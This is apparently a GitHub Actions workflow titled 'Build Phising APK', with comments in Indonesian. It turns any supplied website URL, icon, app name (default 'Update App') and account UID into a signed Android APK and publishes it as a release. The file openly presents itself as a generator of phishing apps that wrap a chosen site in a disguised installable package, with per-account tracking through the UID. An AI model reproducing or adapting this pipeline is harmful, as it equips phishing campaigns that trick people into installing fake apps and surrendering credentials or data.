name: Build Phising APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama aplikasi (label APK & nama file)'
        required: true
        default: 'Update App'
      website_url:
        description: 'URL Website yang mau dijadikan APK'
        required: true
      icon_url:
        description: 'URL icon'
        required: true
      uid:
        description: 'UID akun'
        required: true
      package_name:
        description: 'Package name APK'
        required: false
        default: 'com.sync.xxx'

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v4
        with:
          packages: ''

      - name: Setup Gradle cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      # ─── Override app label ───
      - name: Override app label
        shell: bash
        run: |
          cd android
          APP_NAME="${{ github.event.inputs.app_name }}"
          APP_NAME_ESC=$(echo "$APP_NAME" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
          
          STRINGS_FILE="app/src/main/res/values/strings.xml"
          
          if [ ! -f "$STRINGS_FILE" ]; then
            mkdir -p "$(dirname "$STRINGS_FILE")"
            echo '<?xml version="1.0" encoding="utf-8"?>' > "$STRINGS_FILE"
            echo '<resources>' >> "$STRINGS_FILE"
            echo '</resources>' >> "$STRINGS_FILE"
          fi
          
          if grep -q 'name="app_name"' "$STRINGS_FILE"; then
            sed -i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">${APP_NAME_ESC}</string>|g" "$STRINGS_FILE"
          else
            sed -i "s|</resources>|    <string name=\"app_name\">${APP_NAME_ESC}</string>\n</resources>|g" "$STRINGS_FILE"
          fi
          
          echo "✅ App label set to: $APP_NAME"

      # ─── Override package name ───
      - name: Override package name
        shell: bash
        run: |
          set -e
          cd android
          NEW_PKG="${{ github.event.inputs.package_name }}"
          if [ -z "$NEW_PKG" ]; then NEW_PKG="com.sync.xxx"; fi

          OLD_PKG=""
          if [ -f app/build.gradle.kts ]; then
            OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
            if [ -z "$OLD_PKG" ]; then
              OLD_PKG=$(grep -oP 'applicationId\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
            fi
          fi
          if [ -z "$OLD_PKG" ] && [ -f app/build.gradle ]; then
            OLD_PKG=$(grep -oP 'namespace\s+"\K[^"]+' app/build.gradle | head -1 || true)
            if [ -z "$OLD_PKG" ]; then
              OLD_PKG=$(grep -oP 'applicationId\s+"\K[^"]+' app/build.gradle | head -1 || true)
            fi
          fi

          if [ -z "$OLD_PKG" ]; then
            echo "⚠️ Tidak bisa deteksi OLD package, pakai default com.sync.xxx"
            OLD_PKG="com.sync.xxx"
          fi

          echo "Old package: $OLD_PKG → New package: $NEW_PKG"

          if [ "$OLD_PKG" = "$NEW_PKG" ]; then
            echo "✅ Package sudah sama, skip replace"
            exit 0
          fi

          if [ -f app/build.gradle.kts ]; then
            sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
            sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
          fi
          if [ -f app/build.gradle ]; then
            sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
            sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
          fi

          OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
          NEW_PATH="app/src/main/java/$(echo $NEW_PKG | tr '.' '/')"
          if [ -d "$OLD_PATH" ]; then
            mkdir -p "$(dirname "$NEW_PATH")"
            mv "$OLD_PATH" "$NEW_PATH"
          fi
          find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
          MANIFEST="app/src/main/AndroidManifest.xml"
          if [ -f "$MANIFEST" ]; then
            if grep -q 'package="' "$MANIFEST"; then
              sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" "$MANIFEST"
            fi
            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" "$MANIFEST"
          fi
          find app/src/main/res -type f -name "*.xml" -exec sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} + 2>/dev/null || true

      # ─── Set icon from URL ───
      - name: Set icon from URL
        shell: bash
        run: |
          cd android
          ICON_URL="${{ github.event.inputs.icon_url }}"
          if [ -z "$ICON_URL" ]; then exit 0; fi

          sudo apt-get update -qq
          sudo apt-get install -y -qq imagemagick wget file
          
          wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL -A "Mozilla/5.0" "$ICON_URL" -o /tmp/custom_icon_raw
          convert /tmp/custom_icon_raw /tmp/custom_icon.png
          
          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
            DIR="app/src/main/res/mipmap-$d"
            mkdir -p "$DIR"
            case $d in
              mdpi)    SZ=48  ;;
              hdpi)    SZ=72  ;;
              xhdpi)   SZ=96  ;;
              xxhdpi)  SZ=144 ;;
              xxxhdpi) SZ=192 ;;
            esac
            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher.png"
            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher_round.png" 2>/dev/null || true
          done
          echo "✅ Icons replaced"

      # ─── 🔥 INJECT WEBSITE URL (BUKAN HTML) ───
      - name: Inject Website URL
        shell: bash
        run: |
          cd android
          mkdir -p app/src/main/assets
          
          # Simpan URL ke dalam file JSON untuk dibaca oleh MainActivity.kt
          echo "{\"url\":\"${{ github.event.inputs.website_url }}\"}" > app/src/main/assets/website.json
          
          echo "✅ URL berhasil di-inject: ${{ github.event.inputs.website_url }}"

      # ─── Inject UID ───
      - name: Inject UID
        shell: bash
        run: |
          cd android
          mkdir -p app/src/main/assets
          echo "{\"uid\":\"${{ github.event.inputs.uid }}\"}" > app/src/main/assets/uid.json
          echo "✅ uid.json written: ${{ github.event.inputs.uid }}"

      # ─── Setup signing ───
      - name: Setup debug keystore
        shell: bash
        run: |
          mkdir -p ~/.android
          keytool -genkey -v \
            -keystore ~/.android/debug.keystore \
            -storepass android \
            -alias androiddebugkey \
            -keypass android \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null || true

      # ─── Build APK ───
      - name: Build APK
        shell: bash
        run: |
          cd android
          if [ ! -f "./gradlew" ]; then
            echo "⚠️ gradlew tidak ditemukan, mendownload Gradle 8.5 secara manual..."
            wget -q https://services.gradle.org/distributions/gradle-8.5-bin.zip
            unzip -q gradle-8.5-bin.zip
            chmod +x ./gradle-8.5/bin/gradle
            ./gradle-8.5/bin/gradle assembleRelease --stacktrace
          else
            echo "✅ gradlew ditemukan, memulai build..."
            chmod +x ./gradlew
            ./gradlew assembleRelease --stacktrace
          fi

      # ─── Rename APK Sesuai Nama Aplikasi ───
      - name: Rename APK
        shell: bash
        run: |
          APK_PATH=$(find android/app/build/outputs/apk/release -name "*.apk" | head -1)
          if [ -z "$APK_PATH" ]; then
            echo "❌ APK tidak ditemukan!"
            exit 1
          fi
          
          # Ambil nama app dari input, ganti spasi dengan underscore
          APP_NAME="${{ github.event.inputs.app_name }}"
          SAFE_NAME=$(echo "$APP_NAME" | tr ' ' '_')
          FINAL_APK_NAME="${SAFE_NAME}.apk"
          
          cp "$APK_PATH" "./$FINAL_APK_NAME"
          echo "✅ APK siap: $FINAL_APK_NAME ($(du -h $FINAL_APK_NAME | cut -f1))"
          
          # Simpan nama file ke environment variable untuk step selanjutnya
          echo "FINAL_APK_NAME=$FINAL_APK_NAME" >> $GITHUB_ENV

      # ─── Upload ke Release ───
      - name: Create Release & Upload APK
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.run_number }} — ${{ github.event.inputs.app_name }}"
          body: |
            **App Name:** ${{ github.event.inputs.app_name }}
            **Website:** ${{ github.event.inputs.website_url }}
            **UID:** ${{ github.event.inputs.uid }}
            **Run:** #${{ github.run_number }}
          files: ${{ env.FINAL_APK_NAME }}
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # ─── Upload artifact (backup) ───
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: Phising-APK-Build-${{ github.run_number }}
          path: ${{ env.FINAL_APK_NAME }}
          retention-days: 30